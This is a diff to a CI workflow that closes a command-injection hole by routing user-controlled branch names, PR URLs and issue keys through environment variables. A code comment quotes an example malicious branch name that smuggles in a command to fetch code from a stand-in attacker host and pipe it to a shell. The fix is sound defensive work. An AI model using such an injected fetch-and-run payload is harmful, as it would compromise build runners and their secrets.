@@ -105,9 +105,16 @@ jobs:
 
       - name: Trigger preview deploys
         if: steps.changes.outputs.code == 'true' || steps.changes.outputs.shared == 'true'
-        run: rando deploy branch '${{ github.head_ref }}' --stable-url
+        # github.head_ref is user-influenceable (git allows a wide
+        # character set in branch names; a fork-PR head or a
+        # collaborator could craft `'); curl evil.example | sh #` and
+        # break out of the single-quoted arg below). Plumb through
+        # env: so bash treats the value as data, never as script.
+        # Pattern matches the integration-tests.yml fix in #192.
         env:
+          BRANCH: ${{ github.head_ref }}
           FORCE_COLOR: '1'
+        run: rando deploy branch "$BRANCH" --stable-url
 
       # Issue tracker: each ticket referenced by this PR → In Review,
       # plus a comment with the per-app stable deploy URLs. Soft-fails
@@ -118,18 +125,25 @@ jobs:
 
       - name: Sync issues → In Review with deploy URLs
         if: vars.TRACKER_ENABLED != 'false' && (steps.changes.outputs.code == 'true' || steps.changes.outputs.shared == 'true') && steps.refs.outputs.keys != ''
+        # Every user-influenceable value used in shell is plumbed via
+        # env: blocks (CWE-77 prevention). github.head_ref + pr.html_url
+        # + the issue-keys output (whose source is PR title/body
+        # parsing — user-controlled) all go through env vars, not
+        # template interpolation. Pattern from #192.
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          FORCE_COLOR: '1'
+          BRANCH: ${{ github.head_ref }}
+          PR_URL: ${{ github.event.pull_request.html_url }}
+          KEYS: ${{ steps.refs.outputs.keys }}
         run: |
-          BRANCH='${{ github.head_ref }}'
           MSG=$(printf 'Branch deploy live:\n\n- https://%s-api.rando-id.dev\n- https://%s-web.rando-id.dev\n- https://%s-admin.rando-id.dev\n\nPR: %s' \
-            "$BRANCH" "$BRANCH" "$BRANCH" "${{ github.event.pull_request.html_url }}")
-          echo '${{ steps.refs.outputs.keys }}' | while IFS= read -r key; do
+            "$BRANCH" "$BRANCH" "$BRANCH" "$PR_URL")
+          printf '%s\n' "$KEYS" | while IFS= read -r key; do
             [ -z "$key" ] && continue
             echo "→ $key in-review + comment"
             rando issues lifecycle "$key" in-review --message "$MSG" || echo "(non-fatal: $key)"
           done
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          FORCE_COLOR: '1'
 
   teardown:
     if: ${{ vars.PREVIEW_ENABLED != 'false' && github.event.action == 'closed' }}
@@ -148,9 +162,12 @@ jobs:
           service-account-token: ${{ secrets.OP_SERVICE_ACCOUNT_TOKEN }}
 
       - name: Remove stable URLs
-        run: rando deploy teardown '${{ github.head_ref }}' --yes
+        # Same CWE-77 concern as the branch-deploy step above —
+        # github.head_ref via env, not template interpolation.
         env:
+          BRANCH: ${{ github.head_ref }}
           FORCE_COLOR: '1'
+        run: rando deploy teardown "$BRANCH" --yes
 
       # Optional: drop the per-PR Neon branch.
       # - name: Delete Neon branch
